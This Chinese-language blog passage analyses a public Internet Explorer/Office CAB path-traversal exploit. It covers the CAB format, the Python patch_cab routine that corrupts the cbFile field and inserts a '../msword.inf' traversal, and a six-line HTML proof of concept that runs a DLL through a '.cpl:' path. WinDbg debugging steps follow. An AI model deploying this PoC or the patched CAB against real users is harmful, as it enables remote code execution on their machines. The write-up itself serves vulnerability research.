
其实还有一些内容是可以处理的，但是到此为止已经明显能够看出代码的功能了。它向服务器端请求并插入了`20fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0k6Q4x3X3f1I4y4e0g2Q4x3V1k6%4L8%4u0V1i4K6u0W2j5$3q4T1`文件，同时设置`script`标签的`location`属性为不同路径下的`msword.inf`文件。

根据`exploit.py`，`msword.inf`文件就是`word.dll`文件，而`word.dll`文件的内容是命令行中指定的payload，即`test/calc.dll`的内容。

而`word.cab`则是由`lcab '../msword.inf' out.cab`命令以及`patch_cab('out.cab')`命令生成的`out.cab`文件复制得到。

也就是说由于漏洞的存在，导致在请求插入了`word.cab`之后，能够做到payload的执行

## 2.3 cab文件格式

根据wiki，cab文件就是Microsoft Windows中一种支持无损数据压缩以及数字证书的压缩格式。每个cab文档都由文件夹组成，每个文件夹作为单独的压缩块，文件夹中包含了不同的文件，不存在空文件夹。

从数据流的角度看，cab文件由`CFHEADER`、`CFFOLDER`、`CFFILE`、`CFDATA`四个结构组成。我们以`word.cab`文件为例，讲解这四个结构。

### 2.3.1 CFHEADER

```
struct CFHEADER {
    u1  signature[4];      // 4D 53 43 46 即MSCF
    u4  reserved1;         // 00 00 00 00
    u4  cbCabinet;         // 84 7A 03 00 文件大小227972字节
    u4  reserved2          // 00 00 00 00
    u4  coffFiles;         // 2C 00 00 00 第一个CFFILE结构偏移
    u4  reserved3;         // 00 00 00 00
    u1  versionMinor;      // 03 版本信息
    u1  versionMajor;      // 01 版本信息
    u2  cFolders;          // 01 00 CFFOLDER的个数
    u2  cFiles;            // 01 00 CFFILE的个数
    u2  flags;             // 00 00 标志
    u2  setID;             // D2 04 用于标志同一集合内的所有cab文件
    u2  iCabinet;          // 00 00 该文件是集合中的第一个文件
    // 接下来的都是可选项，由于flags为0，未设置任何标志位，
    // 所以word.cab文件不包含接下来的数据项
    u2  cbCFHeader;
    u1  cbCFFolder;
    u1  cbCFData;
    u1  abReserve[];
    u1  szCabinetPrev[];
    u1  szDiskPrev[];
    u1  szCabinetNext[];
    u1  szDiskNext[];
};
```

### 2.3.2 CFFOLDER

之后是`cFolders`个`CFFOLDER`结构，由于`cFolders`为1，所以这里只有一个`CFFOLDER`结构。

```
struct CFFOLDER {
    u4  coffCabStart;    // 4A 00 00 00 第一个CFDATA的偏移
    u2  cCFData;         // 07 00 CFDATA的个数
    u2  typeCompress;    // 00 00 CFDATA的压缩类型，未压缩
    u1  abReserve[];     // 可选项，不包含
};
```

### 2.3.3 CFFILE

之后是`cFiles`个`CFFILE`结构，由于`cFiles`为1，所以这里只有一个`CFFILE`结构。

```
struct CFFILE {
    u4  cbFile;             // 02 00 5C 41 未压缩的文件大小 1096548354字节？？
    u4  uoffFolderStart;    // 00 00 00 00 该文件在文件夹中的未压缩偏移
    u2  iFolder;            // 00 00 包含该文件的文件夹索引
    u2  date;               // 54 53 最后修改日期 2021-10-20
    u2  time;               // D1 08 最后修改时间 01：06：34
    u2  attribs;            // 20 00 属性
    u1  szName[];           // 这里是14字节的字符串，当前文件名称 ../msword.inf
};
```

`cbFile`字段存在问题，太大了。

### 2.3.4 CFDATA

之后是`cCFData`个`CFDATA`结构，由于`cCFData`是7，所以这里有7个`CFDATA`结构。

```
struct CFDATA {
    u4  csum;           // 当前CFDATA结构的checksum
    u2  cbData;         // 该CFDATA结构包含的数据字节数
    u2  cbUncomp;       // 该CFDATA结构包含的未压缩数据字节数
    u1  abReserve[];    // 可选项，word.cab不包含
    u1  ab[cbData];     // 压缩后数据
};
```

### 2.3.5 word.cab的问题

根据2.2小结的结论，`word.cab`则是由`lcab '../msword.inf' out.cab`命令以及`patch_cab('out.cab')`命令生成的`out.cab`文件复制得到的，看一下`patch_cab`:

```
m_off = 0x2d

def patch_cab(path):
    f_r = open(path, 'rb')
    cab_content = f_r.read()
    f_r.close()

    out_cab = cab_content[:m_off]
    out_cab += b'\x00\x5c\x41\x00'
    out_cab += cab_content[m_off+4:]

    out_cab = out_cab.replace(b'..\\msword.inf', b'../msword.inf')

    f_w = open(path, 'wb')
    f_w.write(out_cab)
    f_w.close()
    return
```

它把位于`0x2d`偏移处的四个字节修改成了`0x00415c00`，并且对`..\\msword.inf`进行了替换。

在根据`word.cab`分析cab文件格式的时候，我们遇到一个问题，`CFFILE`中的`cbFile`的值不太对。按道理来说，`patch_cab`想要修改的应该就是`cbFile`这个字段，但是`m_off`的选取不正常，看起来好像是假设`CFFOLDER`中的`abReserve`字段也存在一个字节。

为此我修改了一下`exploit.py`，删除了`patch_cab`函数的调用，重新观察生成的`word.cab`文件，此时`cbFile`处的数据为`02 7A 03 00`，也就是说未压缩的文件大小为227842字节。

*注：如果你检查一下`test/calc.dll`文件的大小，会发现也是227842字节，因为这个cab文件未压缩，而且只包含`calc.dll`这一个文件。*

因此，虽然目前还不知道为什么要修改`cbFile`字段，但是`patch_cab`这个函数应该是存在问题的。

## 2.4 小结

到目前为止，通过分析poc生成代码`exploit.py`，我们了解了进行漏洞利用的相关文件是如何生成的；同时对生成的`word.html`中的javascript代码进行了反混淆，确定了其功能；最后以`word.cab`为模板了解了cab文件格式。

但是仍旧有很多问题：

1. 为什么要修改`cbFile`字段为`0x00415C00`？
2. 替换`..\\msword.inf`的作用是什么？
3. `word.html`中，以`.cpl:`开头的一系列`msword.inf`的路径有什么用？
4. `word.cab`中的`msword.inf`与第三点中的`msword.inf`有什么关联吗？

# 3. 漏洞利用调试分析

*注：我在调试之前，手工把`word.cab`中`cbFile`的字段改成了`0x00415c00`，之前因为`patch_cab`存在问题，把这里修改成了`0x415c0002`，虽然这个修改并不影响最终结果。*

## 3.1 exploit测试

操作系统：Win10 专业版 1709

nodejs: 16.11.1

IE: 11.1087.16299.0

因为我的win10虚拟机没装office，为了方便测试，就使用了j00sean在twitter中提到的6行代码：

```html
<html>
<script>
var obj = document.createElement("object");
obj.setAttribute("codebase", window.location.origin + "/word.cab#version=5,0,0,0");
obj.setAttribute("classid", "CLSID:edbc374c-5730-432a-b5b8-de94f0b57217");
var i = document.createElement("iframe");
document.documentElement.appendChild(i);
i.src = ".cpl:../../../AppData/Local/Temp/Low/msword.inf"
</script>
</html>
```

1. 安装node-js，并安装`http-server`，具体操作见参考资料6
2. 在桌面创建一个文件夹，包含文件`word.cab`，以及由上面代码组成的文件`exploit.html`
3. 在上述文件夹中打开cmd，输入`http-server`开启服务器
4. 在IE中输入地址`` 9eaK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0R3H3z5o6m8Q4x3V1k6W2P5s2m8D9L8$3W2@1i4K6u0W2K9s2c8E0L8l9`.`. ``，回车，成功弹出计算器

![图片描述](https://bbs.kanxue.com/upload/attach/202110/600394_VBBJZ35ZTUSWAWN.png)

在procmon监控的事件中，找到了IE写入`word[1].cab`行为：

![图片描述](https://bbs.kanxue.com/upload/attach/202110/600394_DBAF4BZNJST6Q33.png)

找到了IE写入`msword.inf`行为：

![图片描述](https://bbs.kanxue.com/upload/attach/202110/600394_GX37D5JBWSR3B3Y.png)

找到了`control.exe`运行`msword.inf`行为：

![图片描述](https://bbs.kanxue.com/upload/attach/202110/600394_DFD5W2QZ8DRWSNM.png)

亲自搭建环境测试之后，对于2.4中的第三个和第四个问题已经有了答案：

1. `word.html`中之所以有那么多`.cpl`开头的路径，是因为无法确定用户环境中，最终`msword.inf`位于哪个文件夹下，所以需要做一些猜测；

2. 两个`msword.inf`不仅内容相同，实际上就是同一个文件。javascript请求`word.cab`之后，这个文件在用户本地会自解压并将解压后文件放到缓存目录下，最终通过之后代码中的`.cpl`路径运行解压后的`msword.inf`文件。

## 3.2 怎样开始调试？

首先需要将`windbg`附加到`iexplore.exe`进程上，不知道是不是操作系统的原因，之前在win7上调试IE的时候没遇到这个问题，但是这次在win10上打开IE后，显示可附加的`iexplore.exe`有两个，一个是主进程，一个是对应打开标签的子进程，附加的时候一定要看好，需要附加到子进程上。

除了选择附加进程外，还存在另一个问题。之前漏洞调试的时候，因为漏洞比较古老，环境存在差异，导致漏洞利用无法成功完成，程序会陷入异常，这种情况对于漏洞调试反而是好的，你可以直接分析异常环境。但是这次漏洞利用成功完成，可以弹出计算器，这就导致如果不设置任何断点，F5继续执行后，整个流程就一发不可收拾地完成了，反而无法进行漏洞调试。所以必须要找到一个合适的断点，方便进行漏洞调试。

根据MSDN上的文档（参考资料1），FCI(File Compression Interface)和FDI(File Decompression Interface)库用于创建CAB以及从CAB中提取文件，相关功能函数位于`cabinet.dll`文件中。其中FDI API函数包括：`FDICreate`, `FDIIsCabinet`, `FDICopy`, `FDIDestroy`。

而从3.1的测试结果来看，IE在请求了`word.cab`文件后，会自动进行解压缩释放cab里面保存的文件。因此我们完全可以在`FDICreate`函数处设置一个断点，此时一切尚未发生。

因此步骤就是：附加IE进程，设置断点，F5继续执行，输入URL，回车，程序中断在`FDICreate`。

```
(11c8.1030): Break instruction exception - code 80000003 (first chance)
eax=02f0a000 ebx=00000000 ecx=7724a080 edx=20010088 esi=7724a080 edi=7724a080
eip=77211900 esp=0c0dfaec ebp=0c0dfb18 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!DbgBreakPoint:
77211900 cc int    3
0:028> bu cabinet!FDICreate
0:028> g
Breakpoint 0 hit
eax=0e356efb ebx=07e2b290 ecx=71ab77d0 edx=08000000 esi=07e2b0f8 edi=71ab77d0
eip=71ab77d0 esp=07e2b0d0 ebp=07e2b100 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000203
CABINET!FDICreate:
71ab77d0 8bff            mov     edi,edi
```

## 3.3 静态+动态分析

### 3.3.1 cabinet外层调用分析
